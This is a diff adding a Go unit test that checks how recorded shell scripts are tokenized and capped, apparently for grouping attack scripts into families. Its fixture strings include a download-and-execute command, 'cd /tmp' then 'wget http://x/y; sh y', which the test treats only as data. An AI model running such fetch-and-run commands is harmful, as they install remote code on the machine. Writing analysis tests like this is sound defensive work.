@@ -1,6 +1,10 @@
 package script
 
-import "testing"
+import (
+	"reflect"
+	"strings"
+	"testing"
+)
 
 func TestDistanceBasics(t *testing.T) {
 	a := []string{"cd", "/tmp", ";", "wget", "<url>"}
@@ -97,5 +101,28 @@ func TestAssignFamilyTieGoesToSmallestFingerprint(t *testing.T) {
 	reps := []Rep{{Fingerprint: "aa", Tokens: x}, {Fingerprint: "bb", Tokens: x}}
 	if fp, _, _ := AssignFamily(x, reps); fp != "aa" {
 		t.Fatalf("tie went to %q", fp)
+	}
+}
+
+// Tokens joins lines with ";" and caps at MaxDistanceTokens, which is what
+// scripts.token_count stores (audit M7).
+func TestTokensJoinsLinesAndCaps(t *testing.T) {
+	enc := Join([]string{EncodeLine("cd /tmp"), EncodeLine("wget http://x/y; sh y")})
+	want := []string{"cd", "/tmp", ";", "wget", "<url>", ";", "sh", "y"}
+	if got := Tokens(enc); !reflect.DeepEqual(got, want) {
+		t.Errorf("Tokens = %q, want %q", got, want)
+	}
+	if got := Tokens(""); len(got) != 0 {
+		t.Errorf("Tokens(\"\") = %q", got)
+	}
+	var lines []string
+	for i := 0; i < 200; i++ {
+		lines = append(lines, EncodeLine("id x"))
+	}
+	if got := Tokens(Join(lines)); len(got) != MaxDistanceTokens {
+		t.Errorf("200 lines: %d tokens, want %d", len(got), MaxDistanceTokens)
+	}
+	if got := Tokens(EncodeLine(strings.Repeat("a ", 1000))); len(got) != MaxDistanceTokens {
+		t.Errorf("one long line: %d tokens, want %d", len(got), MaxDistanceTokens)
 	}
 }
